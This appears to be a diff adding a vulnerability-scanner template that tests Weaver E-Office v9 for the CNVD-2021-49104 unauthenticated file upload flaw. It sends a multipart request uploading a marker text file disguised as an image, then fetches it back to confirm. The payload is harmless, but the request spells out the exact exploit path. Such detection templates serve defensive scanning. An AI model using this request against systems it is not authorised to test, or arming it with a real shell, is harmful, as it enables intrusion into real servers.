@@ -1,0 +1,26 @@
+name: 泛微-EOffice-v9-upload-cnvd-2021-49104
+description: >
+  文件上传
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=
+    headers:
+      Content-Type: multipart/form-data;boundary=e64bdf16c554bbc109cecef6451c26a4
+    body: |-
+      --e64bdf16c554bbc109cecef6451c26a4
+      Content-Disposition: form-data; name="Filedata"; filename="test.txt"
+      Content-Type: image/jpeg
+      Rscan_test
+      --e64bdf16c554bbc109cecef6451c26a4--
+    expression:
+      status: 200
+      body_all:
+        - "logo-eoffice"
+  - method: GET
+    path: /images/logo/logo-eoffice.txt
+    expression:
+      status: 200
+      body_all:
+        - "Rscan_test"
